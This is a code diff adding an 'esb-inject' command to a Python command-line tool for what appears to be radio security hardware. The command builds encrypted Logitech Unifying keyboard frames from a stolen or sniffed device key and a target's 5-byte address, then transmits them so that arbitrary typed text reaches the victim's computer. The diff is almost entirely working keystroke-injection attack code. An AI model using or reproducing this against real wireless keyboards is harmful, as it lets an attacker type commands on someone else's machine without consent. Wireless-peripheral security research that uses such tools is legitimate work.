@@ -6399,6 +6399,107 @@ class StandaloneTrigger(DeviceRequiredUnit):
             print(color_string((CR, f"trigger failed: status={resp.status}")))
 
 
+@standalone.command('esb-inject')
+class StandaloneEsbInject(DeviceRequiredUnit):
+    """
+    Inject Logitech Unifying keystrokes: build the encrypted frames host-side
+    (verified) for <text>, stream them to the esb-inject mode, and transmit on
+    the target address. Needs the device key (from `standalone esb_promisc
+    get-result --pairing`, or `data esb-analyze --pairing`) and the target's
+    5-byte address. Frames are swept across the Unifying channel set.
+
+    Example:
+        standalone esb-inject --addr E2C7A1B93F --key 0244aa...4044 --text "hi" --layout dk
+    """
+
+    def args_parser(self) -> ArgumentParserNoExit:
+        parser = ArgumentParserNoExit()
+        parser.description = 'Build and inject Unifying keystrokes for a string'
+        parser.add_argument('--addr', required=True, metavar='<hex>',
+                            help='target 10-hex-char address, prefix byte first')
+        parser.add_argument('--key', required=True, metavar='<hex>',
+                            help='16-byte device key (hex)')
+        parser.add_argument('--text', required=True, metavar='<str>', help='text to type')
+        parser.add_argument('--layout', default='us', choices=['us', 'dk'],
+                            help='keyboard layout (default us)')
+        parser.add_argument('--counter', type=lambda s: int(s, 0), default=0, metavar='<n>',
+                            help='start AES counter (at/ahead of the receiver; default 0)')
+        parser.add_argument('--bitrate', choices=['1m', '2m'], default='2m',
+                            help='PHY bitrate (default 2m)')
+        parser.add_argument('--gap', type=int, default=8, metavar='<ms>',
+                            help='per-frame gap in ms (default 8)')
+        parser.add_argument('--repeat', type=int, default=1, metavar='<n>',
+                            help='whole-job repeats (default 1)')
+        return parser
+
+    def on_exec(self, args):
+        import cli_esb
+        try:
+            addr = bytes.fromhex(args.addr)
+            key = bytes.fromhex(args.key)
+        except ValueError:
+            print(color_string((CR, "--addr and --key must be hex")))
+            return
+        if len(addr) != 5:
+            print(color_string((CR, "--addr must be 5 bytes (10 hex chars)")))
+            return
+        if len(key) != 16:
+            print(color_string((CR, "--key must be 16 bytes (32 hex chars)")))
+            return
+
+        frames, skipped = cli_esb.esb_build_keyboard_frames(
+            key, args.text, args.layout, start_counter=args.counter)
+        if skipped:
+            uniq = "".join(dict.fromkeys(skipped))
+            print(color_string((CY, f"skipped {len(skipped)} char(s) with no {args.layout} key: {uniq!r}")))
+        if not frames:
+            print(color_string((CR, "nothing to inject")))
+            return
+        if len(frames) > 64:
+            print(color_string((CR, f"{len(frames)} frames exceeds the device buffer (64); shorten the text")))
+            return
+
+        resp = self.cmd.standalone_set_mode(StandaloneMode.ESB_INJECT)
+        if hasattr(resp, 'status') and resp.status != Status.SUCCESS:
+            print(color_string((CR, f"set-mode failed: status={resp.status}")))
+            return
+
+        flags = 0x01 if args.bitrate == '1m' else 0x00
+        cfg = struct.pack('<B5sBBB', 1, addr, flags, args.gap & 0xFF, max(1, args.repeat) & 0xFF)
+        resp = self.cmd.standalone_set_config(StandaloneMode.ESB_INJECT, cfg)
+        if resp.status != Status.SUCCESS:
+            print(color_string((CR, f"set-config failed: status={resp.status}")))
+            return
+
+        resp = self.cmd.standalone_esb_inject_load(0)        # reset buffer
+        if resp.status != Status.SUCCESS:
+            print(color_string((CR, f"load reset failed: status={resp.status}")))
+            return
+        chunk = bytearray()
+        for f in frames:
+            rec = bytes([len(f)]) + f
+            if len(chunk) + len(rec) > 200:
+                resp = self.cmd.standalone_esb_inject_load(1, bytes(chunk))
+                if resp.status != Status.SUCCESS:
+                    print(color_string((CR, f"load failed: status={resp.status}")))
+                    return
+                chunk = bytearray()
+            chunk += rec
+        if chunk:
+            resp = self.cmd.standalone_esb_inject_load(1, bytes(chunk))
+            if resp.status != Status.SUCCESS:
+                print(color_string((CR, f"load failed: status={resp.status}")))
+                return
+
+        resp = self.cmd.standalone_trigger()
+        if resp.status == Status.SUCCESS:
+            print(color_string((CG, f"injecting {len(frames)} frame(s) [{args.layout}] to "
+                                    f"{addr.hex().upper()} at counter {args.counter:#x}")))
+            print(color_string((CY, cli_esb.UNIFYING_CREDIT)))
+        else:
+            print(color_string((CR, f"trigger failed: status={resp.status}")))
+
+
 @standalone.command('disarm')
 class StandaloneDisarm(DeviceRequiredUnit):
     """
